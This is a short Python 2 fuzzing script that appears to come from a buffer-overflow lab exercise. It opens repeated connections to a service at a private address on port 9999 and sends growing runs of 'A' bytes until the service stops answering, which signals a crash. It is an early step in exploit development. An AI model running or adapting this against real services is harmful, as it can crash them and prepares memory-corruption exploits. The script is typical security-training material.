import sys,socket 
address = '192.168.69.101'
port = 9999
buffer = ['\x41']
counter = 100
while len(buffer)<= 10:
	buffer.append('\x41'*counter)
	counter=counter+100
try:
	for string in buffer:	
		print '[+] Sending %s bytes...' % len(string)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect=s.connect((address,port))
		s.recv(1024)
		s.send(string + '\r\n')
		print '[!] Done'
except:
 	print '[!] Unable to connect to the application. You may have crashed it.'
 	sys.exit(0)
finally:
	s.close()
